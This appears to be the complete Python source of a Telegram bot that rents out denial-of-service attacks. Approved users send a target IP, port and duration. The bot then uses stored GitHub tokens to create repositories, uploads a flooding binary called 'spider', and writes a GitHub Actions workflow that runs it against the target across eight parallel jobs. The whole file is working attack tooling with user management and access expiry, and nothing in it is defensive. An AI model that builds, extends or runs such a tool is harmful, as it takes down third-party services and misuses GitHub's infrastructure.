import os
import json
import logging
import threading
import time
import uuid
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV VARIABLES =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "spider"
COOLDOWN_DURATION = 40
WAITING_FOR_BINARY = 1
MAX_RETRIES = 3

# ===== GLOBALS =====
current_attack = None
github_tokens = []
owners = {}
approved_users = {}
pending_users = []
attack_lock = threading.Lock()

# ===== FILE OPERATIONS =====
def load_json(filename, default=None):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except:
        return default if default is not None else {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

def load_owners():
    global owners
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    return owners

def load_github_tokens():
    global github_tokens
    github_tokens = load_json('github_tokens.json', [])
    return github_tokens

def load_approved_users():
    global approved_users
    approved_users = load_json('approved_users.json', {})
    return approved_users

def load_pending_users():
    global pending_users
    pending_users = load_json('pending_users.json', [])
    return pending_users

# ===== INIT =====
load_owners()
load_github_tokens()
load_approved_users()
load_pending_users()

# ===== HELPERS =====
def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

def start_attack(ip, port, time_val, user_id):
    global current_attack
    with attack_lock:
        current_attack = {
            "ip": ip, "port": port, "time": int(time_val),
            "user_id": user_id, "start_time": time.time()
        }
    save_json('attack_state.json', current_attack)

def finish_attack():
    global current_attack
    with attack_lock:
        current_attack = None
    save_json('attack_state.json', None)

def is_attack_running():
    if current_attack:
        elapsed = int(time.time() - current_attack['start_time'])
        if elapsed >= current_attack['time']:
            finish_attack()
            return False
        return True
    return False

# ============================================================
# ===== FIXED TOKEN VALIDATION =====
# ============================================================

def validate_github_token(token):
    """Check if GitHub token is valid - FIXED with better error handling"""
    try:
        g = Github(token)
        user = g.get_user()
        # Try to get login - this will raise exception if invalid
        login = user.login
        # Also check rate limit to ensure token is active
        rate = g.get_rate_limit()
        return True, login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid/Expired token"
        elif e.status == 403:
            return False, "Rate limited - try again later"
        elif e.status == 404:
            return False, "Token not found"
        else:
            return False, f"GitHub Error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:30]}"

def get_valid_token():
    """Get first valid token - FIXED with better logic"""
    global github_tokens
    
    if not github_tokens:
        return None, None
    
    # First try to validate all tokens and remove expired ones
    valid_tokens = []
    for token_data in github_tokens:
        token = token_data.get('token')
        if not token:
            continue
        is_valid, info = validate_github_token(token)
        if is_valid:
            token_data['username'] = info
            valid_tokens.append(token_data)
        else:
            logger.warning(f"Token {token[:10]}... invalid: {info}")
    
    # Update tokens list with only valid ones
    if len(valid_tokens) != len(github_tokens):
        github_tokens = valid_tokens
        save_json('github_tokens.json', github_tokens)
    
    if not github_tokens:
        return None, None
    
    # Return first valid token
    token_data = github_tokens[0]
    return token_data['token'], token_data

def auto_remove_expired_tokens():
    """Remove invalid/expired tokens automatically - FIXED"""
    global github_tokens
    if not github_tokens:
        return 0
    
    removed_count = 0
    valid_tokens = []
    
    for token_data in github_tokens:
        token = token_data.get('token')
        if not token:
            removed_count += 1
            continue
        
        is_valid, info = validate_github_token(token)
        if is_valid:
            token_data['username'] = info
            valid_tokens.append(token_data)
        else:
            removed_count += 1
            logger.warning(f"Removed expired token: {token[:10]}... - {info}")
    
    if removed_count > 0:
        github_tokens = valid_tokens
        save_json('github_tokens.json', github_tokens)
        logger.info(f"✅ Auto-removed {removed_count} expired tokens. Remaining: {len(github_tokens)}")
    
    return removed_count

# Run auto-remove on startup
auto_remove_expired_tokens()

# ============================================================
# ===== BINARY UPLOAD HANDLER =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can upload binary.")
        return ConversationHandler.END
    
    # Auto-clean expired tokens before upload
    removed = auto_remove_expired_tokens()
    if removed > 0:
        await update.message.reply_text(f"🧹 Auto-removed {removed} expired tokens.\nRemaining: {len(github_tokens)}")
    
    if not github_tokens:
        await update.message.reply_text("❌ No valid GitHub tokens. Add token first with /addtoken")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📤 **Send me the `spider` binary file**\n\n"
        "File name must be exactly: `spider`\n"
        "Send /cancel to cancel."
    )
    return WAITING_FOR_BINARY

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can upload binary.")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file.")
        return WAITING_FOR_BINARY
    
    file = update.message.document
    file_name = file.file_name
    
    if file_name != "spider":
        await update.message.reply_text(
            f"❌ File must be named `spider`.\n"
            f"Current: `{file_name}`\n\n"
            f"Rename to `spider` and try again."
        )
        return WAITING_FOR_BINARY
    
    # Auto-remove expired tokens before upload
    removed = auto_remove_expired_tokens()
    if not github_tokens:
        await update.message.reply_text("❌ No valid GitHub tokens. Add token first with /addtoken")
        return ConversationHandler.END
    
    progress = await update.message.reply_text(f"📤 Uploading to {len(github_tokens)} repositories...")
    
    success_count = 0
    fail_count = 0
    results = []
    
    # Download file
    file_obj = await file.get_file()
    file_path = f"temp_{file.file_id}.bin"
    await file_obj.download_to_drive(file_path)
    
    with open(file_path, 'rb') as f:
        content = f.read()
    
    os.remove(file_path)
    
    # First pass: Validate all tokens
    valid_tokens = []
    for token_data in github_tokens:
        is_valid, info = validate_github_token(token_data['token'])
        if is_valid:
            token_data['username'] = info
            valid_tokens.append(token_data)
        else:
            results.append((token_data.get('username', 'unknown'), False, f"Expired/Invalid"))
            fail_count += 1
    
    if valid_tokens:
        github_tokens = valid_tokens
        save_json('github_tokens.json', github_tokens)
    
    # Upload to valid tokens
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            try:
                existing = repo.get_contents("spider")
                repo.update_file("spider", "Update spider binary", content, existing.sha)
                results.append((token_data['username'], True, "Updated"))
            except:
                repo.create_file("spider", "Add spider binary", content)
                results.append((token_data['username'], True, "Created"))
            success_count += 1
        except Exception as e:
            results.append((token_data['username'], False, str(e)[:50]))
            fail_count += 1
    
    msg = (
        f"✅ **Binary Upload Complete!**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n"
        f"📊 Total: {len(github_tokens)}\n"
        f"━━━━━━━━━━━━━━━━━\n"
    )
    
    for username, success, status in results:
        if success:
            msg += f"✅ @{username}: {status}\n"
        else:
            msg += f"❌ @{username}: {status}\n"
    
    await progress.edit_text(msg)
    return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Binary upload cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN MANAGEMENT COMMANDS - FIXED =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can add tokens.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addtoken <github_token>")
        return
    
    token = context.args[0]
    
    # Validate token first
    is_valid, info = validate_github_token(token)
    if not is_valid:
        await update.message.reply_text(f"❌ Invalid token: {info}\n\nPlease generate a new token from GitHub.")
        return
    
    # Check if token already exists
    for t in github_tokens:
        if t.get('token') == token:
            await update.message.reply_text("❌ Token already added.")
            return
    
    try:
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        # Check for existing repos with 'spider' name
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False, auto_init=True)
        
        github_tokens.append({
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat(),
            'valid': True
        })
        save_json('github_tokens.json', github_tokens)
        
        await update.message.reply_text(
            f"✅ **Token Added!**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 User: @{username}\n"
            f"📁 Repo: `{repo_name}`\n"
            f"📊 Total: {len(github_tokens)}\n"
            f"🔒 Status: Valid"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can remove tokens!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "📝 **Usage:** `/removetoken <token>`\n\n"
            "**Example:** `/removetoken ghp_abc123xyz`\n\n"
            "💡 Use `/tokens` to see all tokens\n"
            "💡 Use `/cleartokens` to remove ALL"
        )
        return
    
    token_to_remove = context.args[0]
    
    found = False
    for i, t in enumerate(github_tokens):
        if t.get('token') == token_to_remove:
            github_tokens.pop(i)
            save_json('github_tokens.json', github_tokens)
            found = True
            break
    
    if found:
        await update.message.reply_text(
            f"✅ **Token removed successfully!**\n"
            f"`{token_to_remove[:10]}...{token_to_remove[-4:]}`\n\n"
            f"📊 Remaining tokens: {len(github_tokens)}"
        )
    else:
        await update.message.reply_text(
            "❌ **Token not found!**\n\n"
            f"🔍 Use `/tokens` to see all stored tokens.\n"
            f"💡 Token might have been auto-removed if expired."
        )

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can clear tokens!")
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 No tokens to clear!")
        return
    
    count = len(github_tokens)
    
    if len(context.args) == 1 and context.args[0].lower() == "confirm":
        github_tokens.clear()
        save_json('github_tokens.json', github_tokens)
        await update.message.reply_text(f"🗑️ **Cleared all {count} tokens!**")
    else:
        await update.message.reply_text(
            f"⚠️ **WARNING: Delete ALL {count} tokens?**\n\n"
            f"Type: `/cleartokens confirm` to confirm.\n"
            f"This action cannot be undone!"
        )

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can check tokens!")
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 No tokens to check.")
        return
    
    status_msg = await update.message.reply_text("🔄 Checking tokens...")
    
    removed = auto_remove_expired_tokens()
    
    msg = "🔍 **Token Status Report**\n━━━━━━━━━━━━━━━━━\n"
    msg += f"📊 Total: {len(github_tokens)}\n"
    msg += f"🧹 Expired removed: {removed}\n\n"
    
    if github_tokens:
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "..." + t['token'][-4:]
            username = t.get('username', 'Unknown')
            msg += f"{i}. @{username}\n"
            msg += f"   `{token_short}`\n"
            msg += f"   ✅ Valid\n\n"
    else:
        msg += "❌ No valid tokens remaining!"
    
    await status_msg.edit_text(msg)

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view tokens.")
        return
    
    # Auto-clean expired tokens
    removed = auto_remove_expired_tokens()
    
    if not github_tokens:
        if removed > 0:
            await update.message.reply_text(f"🧹 Auto-removed {removed} expired tokens.\n📭 No valid tokens remaining.")
        else:
            await update.message.reply_text("📭 No tokens added.")
        return
    
    msg = "📋 **GitHub Tokens**\n━━━━━━━━━━━━━━━━━\n"
    if removed > 0:
        msg += f"🧹 Auto-removed {removed} expired tokens\n\n"
    
    for i, t in enumerate(github_tokens, 1):
        token_short = t['token'][:10] + "..." + t['token'][-4:]
        username = t.get('username', 'Unknown')
        added_at = t.get('added_at', 'Unknown')
        msg += f"{i}. @{username}\n"
        msg += f"   `{token_short}`\n"
        msg += f"   📁 `{t['repo']}`\n\n"
    
    msg += f"\n📊 Total: {len(github_tokens)} valid tokens"
    await update.message.reply_text(msg)

# ============================================================
# ===== FIXED ATTACK COMMAND =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_attack(user_id):
        await update.message.reply_text("❌ No permission. Contact owner.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "📝 **Usage:** `/attack <ip> <port> <time>`\n\n"
            "**Example:** `/attack 1.1.1.1 80 60`\n\n"
            "⚠️ Time: 5-3600 seconds"
        )
        return
    
    # Auto-remove expired tokens
    removed = auto_remove_expired_tokens()
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **No valid GitHub tokens!**\n\n"
            "Add token: `/addtoken <github_token>`\n"
            "Check status: `/checktokens`\n"
            "View tokens: `/tokens`"
        )
        return
    
    if is_attack_running():
        await update.message.reply_text(f"⚠️ Attack already running on {current_attack['ip']}:{current_attack['port']}")
        return
    
    ip, port_str, time_str = context.args
    try:
        port = int(port_str)
        time_val = int(time_str)
    except ValueError:
        await update.message.reply_text("❌ Port and time must be numbers.")
        return
    
    if not (1 <= port <= 65535):
        await update.message.reply_text("❌ Port must be between 1-65535.")
        return
    
    if time_val < 5 or time_val > 3600:
        await update.message.reply_text("❌ Time must be between 5-3600 seconds.")
        return
    
    start_attack(ip, port, time_val, user_id)
    
    # Try multiple tokens with retry
    attack_started = False
    last_error = None
    
    for retry in range(MAX_RETRIES):
        # Get valid token
        token, token_data = get_valid_token()
        
        if not token:
            await update.message.reply_text(
                "❌ **No valid GitHub tokens found!**\n\n"
                "Use `/checktokens` to see status.\n"
                "Add new token with `/addtoken`."
            )
            finish_attack()
            return
        
        try:
            g = Github(token)
            repo = g.get_repo(token_data['repo'])
            
            # Check if spider exists
            try:
                repo.get_contents("spider")
            except:
                await update.message.reply_text(
                    "❌ **Binary 'spider' not found in repo!**\n\n"
                    "Upload with `/binary_upload` first."
                )
                finish_attack()
                return
            
            yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} 350
"""
            try:
                file = repo.get_contents(YML_FILE_PATH)
                repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
            except:
                repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
            
            await update.message.reply_text(
                f"✅ **Attack Started!**\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: `{time_val}s`\n"
                f"👤 By: @{update.effective_user.username or 'User'}\n"
                f"📁 Repo: `{token_data['repo']}`\n"
                f"🔑 Token: @{token_data['username']}"
            )
            
            attack_started = True
            threading.Timer(time_val + 10, finish_attack).start()
            break
            
        except GithubException as e:
            last_error = f"GitHub Error: {e.status} - {e.data.get('message', 'Unknown')}"
            logger.warning(f"Attack failed with token {token_data.get('username')}: {last_error}")
            
            # Remove invalid token
            github_tokens = [t for t in github_tokens if t.get('token') != token]
            save_json('github_tokens.json', github_tokens)
            
            if retry < MAX_RETRIES - 1:
                await update.message.reply_text(f"⚠️ Token {token_data.get('username')} failed, trying next...")
            continue
            
        except Exception as e:
            last_error = str(e)[:200]
            logger.warning(f"Attack failed: {last_error}")
            continue
    
    if not attack_started:
        finish_attack()
        await update.message.reply_text(
            f"❌ **Attack failed after {MAX_RETRIES} attempts!**\n\n"
            f"Error: {last_error}\n\n"
            f"💡 Try:\n"
            f"• `/checktokens` - Check token status\n"
            f"• `/addtoken` - Add new token\n"
            f"• `/binary_upload` - Upload binary"
        )

# ============================================================
# ===== OTHER COMMANDS =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    
    if can_attack(user_id):
        keyboard = [
            [InlineKeyboardButton("⚡ Attack", callback_data="attack_help")],
            [InlineKeyboardButton("📊 Status", callback_data="status")],
            [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        ]
        if is_owner(user_id):
            keyboard.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")])
        
        await update.message.reply_text(
            f"🔥 **Bot Active!**\n"
            f"👤 User: @{username}\n"
            f"🎯 Role: {'👑 Owner' if is_owner(user_id) else '✅ Approved'}\n"
            f"📊 Tokens: {len(github_tokens)} valid\n\n"
            f"Use /attack <ip> <port> <time>\n"
            f"Example: /attack 1.1.1.1 80 60",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
            pending_users.append({
                "user_id": user_id,
                "username": username,
                "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            save_json('pending_users.json', pending_users)
            
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 **New Access Request**\nUser: @{username}\nID: `{user_id}`\nUse: /approve {user_id} 7"
                    )
                except:
                    pass
        
        await update.message.reply_text(
            "❌ **Access Denied**\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval."
        )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ No access")
        return
    
    if current_attack:
        elapsed = int(time.time() - current_attack['start_time'])
        remaining = current_attack['time'] - elapsed
        if remaining < 0:
            finish_attack()
            await update.message.reply_text("✅ Attack completed.")
            return
        
        await update.message.reply_text(
            f"🔥 **Attack Running**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{current_attack['ip']}:{current_attack['port']}`\n"
            f"⏱️ Elapsed: `{elapsed}s`\n"
            f"⏱️ Remaining: `{remaining}s`"
        )
    else:
        await update.message.reply_text("✅ No attack running.")

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ No access")
        return
    
    if current_attack:
        target = f"{current_attack['ip']}:{current_attack['port']}"
        finish_attack()
        await update.message.reply_text(f"🛑 Attack stopped on `{target}`")
    else:
        await update.message.reply_text("✅ No attack running.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Bot Commands**\n"
        "━━━━━━━━━━━━━━━━━\n"
        "/start - Menu\n"
        "/attack <ip> <port> <time> - Start attack\n"
        "/status - Check attack\n"
        "/stop - Stop attack\n"
        "/help - This menu\n"
        "/myid - Get user ID\n\n"
        "**Admin Only:**\n"
        "/addtoken <token> - Add GitHub token\n"
        "/removetoken <token> - Remove GitHub token\n"
        "/checktokens - Check & clean expired tokens\n"
        "/cleartokens - Clear all tokens\n"
        "/tokens - List tokens\n"
        "/binary_upload - Upload spider binary\n"
        "/approve <id> <days> - Approve user\n"
        "/remove <id> - Remove user\n"
        "/users - List users\n"
        "/pending - Pending requests\n"
        "/broadcast <msg> - Broadcast\n"
        "/maintenance <on/off> - Maintenance"
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your ID: `{update.effective_user.id}`")

# ============================================================
# ===== ADMIN COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can approve users.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        await update.message.reply_text(f"✅ User `{target_id}` approved for {days} days.")
        
        try:
            await context.bot.send_message(target_id, "✅ Access Granted! Use /start")
        except:
            pass
    except:
        await update.message.reply_text("❌ Invalid input.")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can remove users.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.")
        else:
            await update.message.reply_text("❌ User not found.")
    except:
        await update.message.reply_text("❌ Invalid input.")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view users.")
        return
    
    if not approved_users:
        await update.message.reply_text("📭 No approved users.")
        return
    
    msg = "👤 **Approved Users**\n━━━━━━━━━━━━━━━━━\n"
    for uid, data in approved_users.items():
        msg += f"`{uid}` - {data.get('days', '?')}d\n"
    await update.message.reply_text(msg)

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view pending.")
        return
    
    if not pending_users:
        await update.message.reply_text("📭 No pending requests.")
        return
    
    msg = "⏳ **Pending Requests**\n━━━━━━━━━━━━━━━━━\n"
    for u in pending_users:
        msg += f"`{u.get('user_id')}` - @{u.get('username')}\n"
    await update.message.reply_text(msg)

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can broadcast.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    msg = " ".join(context.args)
    sent = 0
    
    for uid in owners.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 {msg}")
            sent += 1
        except:
            pass
    
    for uid in approved_users.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 {msg}")
            sent += 1
        except:
            pass
    
    await update.message.reply_text(f"✅ Sent to {sent} users.")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can toggle maintenance.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /maintenance <on/off>")
        return
    
    mode = context.args[0].lower()
    if mode == "on":
        save_json('maintenance.json', {"maintenance": True})
        await update.message.reply_text("🔧 Maintenance ENABLED.")
    elif mode == "off":
        save_json('maintenance.json', {"maintenance": False})
        await update.message.reply_text("✅ Maintenance DISABLED.")
    else:
        await update.message.reply_text("❌ Use 'on' or 'off'.")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "attack_help":
        await query.edit_message_text("⚡ Use: /attack <ip> <port> <time>")
    elif data == "status":
        await status_cmd(update, context)
    elif data == "stop":
        await stop_cmd(update, context)
    elif data == "admin_panel" and is_owner(user_id):
        keyboard = [
            [InlineKeyboardButton("📋 Tokens", callback_data="admin_tokens")],
            [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
            [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
            [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🧹 Check Tokens", callback_data="admin_checktokens")],
        ]
        await query.edit_message_text("🔧 **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_tokens":
        await tokens_cmd(update, context)
    elif data == "admin_users":
        await users_cmd(update, context)
    elif data == "admin_pending":
        await pending_cmd(update, context)
    elif data == "admin_binary":
        await query.edit_message_text("📤 Use: /binary_upload")
    elif data == "admin_broadcast":
        await query.edit_message_text("📢 Use: /broadcast <message>")
    elif data == "admin_checktokens":
        await checktokens_cmd(update, context)

# ============================================================
# ===== ERROR HANDLER =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ Error occurred. Try again.")
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Binary upload conversation
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload_start)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, binary_upload_receive),
                CommandHandler("cancel", binary_upload_cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
    )
    app.add_handler(conv_handler)
    
    # Commands
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myid", myid_cmd))
    
    # Admin
    app.add_handler(CommandHandler("addtoken", addtoken_cmd))
    app.add_handler(CommandHandler("removetoken", removetoken_cmd))
    app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
    app.add_handler(CommandHandler("checktokens", checktokens_cmd))
    app.add_handler(CommandHandler("tokens", tokens_cmd))
    app.add_handler(CommandHandler("approve", approve_cmd))
    app.add_handler(CommandHandler("remove", removeuser_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("pending", pending_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("maintenance", maintenance_cmd))
    
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)
    
    logger.info("🚀 Bot is running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
